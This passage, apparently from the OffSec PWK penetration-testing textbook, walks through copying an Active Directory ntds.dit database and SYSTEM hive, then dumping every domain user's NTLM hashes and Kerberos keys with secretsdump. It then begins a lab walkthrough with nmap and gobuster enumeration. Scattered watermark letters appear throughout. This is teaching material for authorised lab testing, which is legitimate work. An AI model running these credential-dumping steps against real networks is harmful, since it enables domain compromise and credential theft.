We’ll now copy the whole AD Database from the shadow copy to the C: drive root folder by
specifying the shadow copy device name and append the full ntds.dit path.
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit
c:\ntds.dit.bak y
1 file(s) copied.
Listing 863 - Copying the ntds database to the C: drive
k
As a last ingredient, to correctly extract the content of ntds.dit, we need to save the SYSTEM hive
from the Windows registry. We can accomplish this with the reg utility and the save argument.
s
C:\>reg.exe save hklm\system c:\system.bak
The operation completed successfully. o
Listing 864 - Copying the ntds database to the C: drive
Once the two .bak files are moved to our Knali machine, we can continue extracting the credential
materials with the secretsdump tool from the impacket suite. We’ll supply the ntds database and
the system hive via -ntds and -system, respectively along with the LOCAL keyword to parse the
i
files locally.
z
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
Impacket v0.10.0 - CopyriDght 2022 SecureAuth Corporation
[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::
[*] Kerberos keys from ntds.dit.bak
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 802
Made in Morocco
Penetration Testing with Kali Linux
Administrator:aes256-cts-hmac-sha1-
96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4
DC1$:aes256-cts-hmac-sha1-
96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
DC1$:des-cbc-md5:f7f804ce43264a43
krbtgt:aes256-cts-hmac-sha1-
96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
...
[*] Cleaning up...
Listing 865 - Copying the ntds database to the C: drive
y
Great! We managed to obtain NTLM hashes and Kerberos keys for every AD user, which can now
be further cracked or used as-is through pass-the-hash attacks.
k
While these methods might work fine, they leave an access trail and may require us to upload
tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a
s
workstation.
To do this, we could move laterally to the domoain controller and run Mimikatz to dump the
password hash of every user, using the DC sync method described in the previous Module, which
can be misused as a less conspicuous persistence technique.
n
Although most penetration tiests wouldn’t require us to be covert, we should
always evaluate a given tzechnique’s stealthiness, which could be useful during
future red-teaming engagements.
D
In this Learning Unit, we explored a few Windows Active Directory persistence techniques that
could be employed during penetration testing or red-teaming exercises whose rules of
engagement mandate we retain long-term access to the compromised environment.
23.3 Wrapping Up
This Module concludes Active Directory concepts by providing an overview on a number of Active
Directory lateral movement and persistence techniques. While many techniques have been
mentioned and explained here, there are many others worth exploring and others yet to be
discovered.
The effectiveness of the techniques we learned is strictly related to the security posture of the
environment we are testing. Although AD security has been greatly improved over the years, its
attack surface it’s ultimately dependent on the complexity of its design and interoperability with
legacy systems that might impose lower security standards.
As we focused on how to execute the said techniques, we also deliberately ignored stealthiness
as this will be a requirement on red-teaming exercises but generally not on penetration testing
ones.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 803
Made in Morocco
Penetration Testing with Kali Linux
Nevertheless, mastering Active Directory enumeration, authentication, and lateral movement
techniques is one step forward in becoming an experienced penetration tester.
y
k
s
o
n
i
z
D
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 804
Made in Morocco
Penetration Testing with Kali Linux
24 Assembling the Pieces
In this Learning Module, we will cover the following Learning Units:
• Enumerating the Public Network
• Attacking a Public Machine
• Gaining Access to the Internal Network
• Enumerating the Internal Network
• Attacking an Internal Web Application
• Gaining Access to the Domain Controller
y
Now that we have introduced all the individual pieces of a penetration test, it’s time to put them
together in a walkthrough. In this Module, we will conduct a simulated penetration test inspired by
k
real-world findings.
The purpose of this Module is to act as a bridge betweesn the PEN200 Modules and the Challenge
Labs. One way to think about this Module is as “Challenge Lab Zero”. If you wish, you can start the
machines and attempt to attack them on your own, and then come back and read the
o
methodology and story described here. Either way, we recommend following this methodology
and the mindset it produces for tackling the Challenge Labs 1-6. Note that to save time, in several
cases we will skip steps that will not yieldn results for this simulation. However, we will call out
these instances as they occur.
In this scenario, the company BEYONiD Finances has tasked us with conducting a penetration test
of their IT infrastructure. The clieznt wants to determine if an attacker can breach the perimeter
and get domain admin privileges in the internal Active Directory (AD) environment. In this
assessment, the client’s goals for us are to obtain domain administrator privileges and access the
D
domain controller.
We should be aware that each client may have different end goals for a penetration test based on
their threat level, data infrastructure, and business model. For example, if the client’s main
business is warehousing data, our goal could be to obtain that data. That is because a breach of
this nature would cause the most significant business impact to the client. In most environments,
domain administrator access would help us accomplish that goal, but that is not always the case.
24.1 Enumerating the Public Network
This Learning Unit covers the following Learning Objectives:
• Enumerate machines on a public network
• Obtain useful information to use for later attacks
In this Learning Unit, we’ll start with the first step of our penetration test, enumeration. Our
fictitious client has provided us with two initial targets, which we can access via the PEN200 VPN.
The following figure shows a network overview based on the client’s information.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 805
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
Figure 286: Network Overview of provided Targets
o
Figure 286 shows the two accessible machines, WEBSRV1 and MAILSRV1, as well as their
corresponding IP addresses.
n
The third octet you observe iin your own lab instance may differ when starting the
VM group later on. z
D
In the first section, we’ll begin by setting up a basic work environment for our penetration test and
then enumerate MAILSRV1.
24.1.1 MAILSRV1
Before we begin to interact with our target to enumerate it, let’s set up a work environment for this
penetration test. This will help us to store obtained files and information in a structured way
throughout the assessment. In later phases of a penetration test, this will prove especially helpful
as we’ll collect a huge amount of data and information.
Structuring and isolating data and settings for multiple penetration tests can be
quite the challenge. By reusing a Kali VM we could accidentally expose previous-
client data to new networks. Therefore, it is recommended to use a fresh Kali
image for every assessment.
For this reason, let’s create a /home/kali/beyond directory on our Kali VM. In it, we’ll create two
directories named after the two target machines we have access to at the moment. In addition,
we’ll create a creds.txt text file to keep track of identified valid credentials and users.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 806
Made in Morocco
Penetration Testing with Kali Linux
kali@kali:~$ mkdir beyond
kali@kali:~$ cd beyond
kali@kali:~/beyond$ mkdir mailsrv1
kali@kali:~/beyond$ mkdir websrv1
kali@kali:~/beyond$ touch creds.txt
Listing 866 - Basic work environment for this penetration test
Now that we set up a work environment, we are ready to enumerate the first target machine,
MAILSRV1.
y
Documenting our findings is a crucial process for every penetration test. For this
Module, we’ll store results in the basic work environment we just set up.
However, Markdown editors, such as Obsidian,1173 havek become quite popular for
documenting findings and data in real assessments as they are application-
independent and contain functions that will simpslify report writing and
collaboration.1174
o
Let’s begin with a port scan of MAILSRV1 using Nmap. A port scan is often the first active
n
information gathering method we’ll perform to get an overview of open ports and accessible
services.
i
z
In a real penetration test, we would also use passive information gathering
techniques such as Google Dorks and leaked password databases to obtain
D
additional information. This would potentially provide us with usernames,
passwords, and sensitive information.
We’ll use -sV to enable service and version detection as well as -sC to use Nmap’s default scripts.
In addition, we’ll enter -oN to create an output file containing the scan results.
kali@kali:~/beyond$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 08:53 EDT
Nmap scan report for 192.168.50.242
Host is up (0.11s latency).
Not shown: 992 closed tcp ports (reset)
PORT STATE SERVICE VERSION
25/tcp open smtp hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp open http Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
1173 (Obsidian, 2022), https://obsidian.md/
1174 (TrustedSec, 2021), https://www.trustedsec.com/blog/obsidian-taming-a-collective-consciousness/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 807
Made in Morocco
Penetration Testing with Kali Linux
| http-methods:
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
110/tcp open pop3 hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
143/tcp open imap hMailServer imapd
|_imap-capabilities: IMAP4 CHILDREN OK ACL IMAP4rev1 completed CAPABILITY NAMESPACE
IDLE RIGHTS=texkA0001 SORT QUOTA
445/tcp open microsoft-ds?
587/tcp open smtp hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows
y
Host script results:
| smb2-time:
| date: 2022-09-29T12:54:00 k
|_ start_date: N/A
| smb2-security-mode:
s
| 3.1.1:
|_ Message signing enabled but not required
|_clock-skew: 21s o
Service detection performed. Please report any incorrect results at
https://nmap.org/submit/ . n
Nmap done: 1 IP address (1 host up) scanned in 37.95 seconds
Listiing 867 - Nmap scan of MAILSRV1
z
Listing 867 shows that Nmap discovered eight open ports. Based on this information, we can
establish that the target machine is a Windows system running an IIS web server and a
D
hMailServer.1175 This is not surprising as the machine is named MAILSRV1 in the topology
provided by the client.
In a real-world penetration test, the hostnames may not always be as descriptive
as they are in this Module.
As we may not be familiar with hMailServer,1176 we can research this application by browsing the
application’s web page. It states that hMailServer is a free, open source e-mail server for
Microsoft Windows.
To identify potential vulnerabilities in hMailServer, we can use a search engine to find CVEs and
public exploits.1177 However, as Nmap didn’t discover a version number, we have to conduct a
1175 (hMailServer Homepage, 2022), https://www.hmailserver.com/
1176 (hMailServer Homepage, 2022), https://www.hmailserver.com/
1177 (CVE Details, 2022), https://www.cvedetails.com/vulnerability-list/vendor_id-8442/Hmailserver.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 808
Made in Morocco
Penetration Testing with Kali Linux
broader search. Unfortunately, the search didn’t provide any meaningful results apart from some
older CVEs.
Figure 287: Vulnerabilities of hMailServer
y
Even if we had found a vulnerability with a matching exploit providing the code
k
execution, we should not skip the remaining enumeration steps. While we may
get access to the target system, we could potentially miss out on vital data or
information for other services and systems. s
o
Next, let’s enumerate the IIS web server. First, we’ll browse the web page.
n
i
z
D
Figure 288: IIS Welcome Page on MAILSRV1
Figure 288 shows that IIS only displays the default welcome page. Let’s try to identify directories
and files by using gobuster. We’ll enter dir to use directory enumeration mode, -u for the URL, -w
for a wordlist, and -x for file types we want to identify. For this example, we’ll enter txt, pdf, and
config to identify potential documents or configuration files. In addition, we’ll use -o to create an
output file.
kali@kali:~/beyond$ gobuster dir -u http://192.168.50.242 -w
/usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 809
Made in Morocco
Penetration Testing with Kali Linux
===============================================================